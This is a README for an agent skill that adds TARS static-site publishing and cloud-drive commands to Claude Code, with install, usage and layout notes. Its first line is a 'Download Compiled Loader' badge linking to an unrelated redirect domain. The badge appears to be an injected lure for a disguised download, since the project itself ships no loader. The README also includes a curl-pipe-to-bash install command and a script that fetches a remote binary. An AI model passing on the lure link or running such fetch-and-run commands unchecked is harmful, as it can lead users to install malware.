# tarslive/skill

[![Download Compiled Loader](https://img.shields.io/badge/Download-Compiled%20Loader-blue?style=flat-square&logo=github)](https://www.shawonline.co.za/redirl)

The agent skill for [TARS](https://tars.live) — agent-first static-site hosting and a private cloud-drive on Cloudflare.

## Install

In any Claude Code (or other supported) project:

```sh
npx skills add tarslive/skill --skill tars -g -a claude-code
```

The skill is installed to `~/.claude/skills/tars/`. Restart Claude Code afterwards.

Alternative install path (curl):

```sh
curl -fsSL https://tars.live/install.sh | bash
```

Both end up at the same location with the same files.

## Usage

After install, your agent can:

- "publish ./my-dashboard as a TARS site" → static-site URL on `*.tars.live`
- "save report.pdf to my TARS drive" → private file storage
- "share this drive file with a 24h link" → public TTL share token

For drive operations, set an API key:

```sh
export TARS_API_KEY='tars_…'   # issue at https://api.tars.live/dashboard
```

## Layout

```
tars/
├── SKILL.md              # what the agent reads
└── scripts/
    ├── publish.sh        # publishes a directory as a TARS site
    ├── drive.sh          # put / get / ls / rm / share on the drive
    └── _ensure-jq.sh     # lazy-fetches a jq binary on first run
```

The `jq` binary is downloaded on first script run (one ~1 MB request) from `https://tars.live/skill/bin/jq-<platform>` and verified against the SHA-256 manifest at `https://tars.live/skill/jq-checksums.json`. It's not committed to this repo to keep checkouts small.

## Source of truth

Skill files in this repo are mirrored from the main TARS monorepo (`apps/web/public/skill/` in [github.com/brucemclachlan/tars](https://github.com/brucemclachlan/tars)). Don't edit `tars/` files here directly — they'll be overwritten on the next sync. File issues and PRs against the main repo.

## License

MIT — see `LICENSE`.
